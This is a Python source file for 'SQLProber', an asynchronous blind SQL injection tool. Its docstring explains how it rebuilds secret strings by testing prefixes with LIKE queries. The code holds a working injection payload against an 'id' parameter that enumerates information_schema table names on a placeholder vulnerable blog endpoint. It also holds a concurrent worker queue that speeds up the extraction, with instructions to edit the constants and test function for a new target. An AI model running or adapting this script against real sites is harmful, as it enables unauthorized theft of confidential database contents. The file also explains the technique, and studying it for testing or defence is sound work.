"""
SQLProber is a script for exploiting SQL injections vulnerable endpoints to read confidential data. It works by building
a tree of strings that are valid prefixes for a list of target strings (or just a single string).

Imagine you wanted to read the secret strings ['xaaa', 'xbbb', 'yaaa'] but the injection only allowed you test if a
string is a prefix of either one of those (think "... WHERE target_col LIKE '<attempt>%'"). You would try with a single
character first: testing if any of the strings start with an 'a', then with a 'b', etc.. This test only passes for 'x'
and 'y'. Then, for every character that passed, you would try appending any second character and recording what two
characters pass the test. This will work only for 'xa', 'xb' and 'ya'. This goes on until you're left with strings for
which no trailing character passes the test anymore. In this case 'xaaa', 'xbbb' and 'yaaa'. Those are the the secret
strings.

This script does exactly this but in an high-performant asynchronous way. To use it you should only need to edit some
constants declared in the top of the file and the test function.

On a test of mine, using 12 workers asynchronously instead of a synchronous approach, brings the required time from
58.00s down to 5.46s.
"""

from asyncio.queues import Queue
from aiohttp import ClientSession

import asyncio
import aiohttp
import string
import time

# How many asynchronous workers to use to perform the HTTP requests
N_WORKERS = 1

# Root string that is the prefix of all secret stings
ROOT = ''
# URL to the vulnerable endpoint
URL = "http://vulnerable-blog.com/article.php"


# Takes in a string of text to test and returns a bool to indicate whether the test passes or not. The text should be
# directly used in a LIKE expression
async def test(sess: ClientSession, text: str):
    params = {
        'id': f"""
            1' AND EXISTS(SELECT 1 FROM information_schema.tables
            WHERE table_schema = 'vulnerable_blog'
            AND table_name COLLATE utf8_bin LIKE BINARY '{text}') OR 'x'='y
        """,
    }

    async with sess.get(URL, params=params) as resp:
        return 'Article not found!' not in await resp.text()


# Escape a string just before using it in a query
def escape(text: str):
    return text.replace('_', '\\_')


# Takes a base string and puts all derivations in the queue
async def branch(q: Queue, base: str):
    for c in set(string.printable) - {'?', '%'}:
        await q.put(base + c)


found = set()


# Loop forever taking an element off the queue and testing it
async def work(q: Queue, sess: ClientSession):
    while True:
        text = await q.get()

        # Test <text>%
        if await test(sess, escape(text) + '%'):
            print(f'PASS - "{text}"%')

            # Did we really need the %? If we're just fine without it, then the string is complete
            if await test(sess, escape(text)):
                print(f'FOUND - "{text}"')
                found.add(text)

            # Otherwise we're missing something, branch off
            else:
                await branch(q, text)

        # Either way call Queue.task_done() so that Queue.join() will work as intended
        q.task_done()


async def main():
    async with aiohttp.ClientSession() as sess:
        q = Queue()
        await branch(q, ROOT)

        # Prepare workers
        workers = [work(q, sess) for _ in range(N_WORKERS)]
        # Start workers
        workers = [asyncio.create_task(worker) for worker in workers]

        await q.join()

        for worker in workers:
            worker.cancel()


if __name__ == '__main__':
    s = time.perf_counter()
    asyncio.run(main())
    f = time.perf_counter()

    print('------------------------------')
    print('Found:')
    print(found)
    print(f'In {f - s:0.2f} seconds')
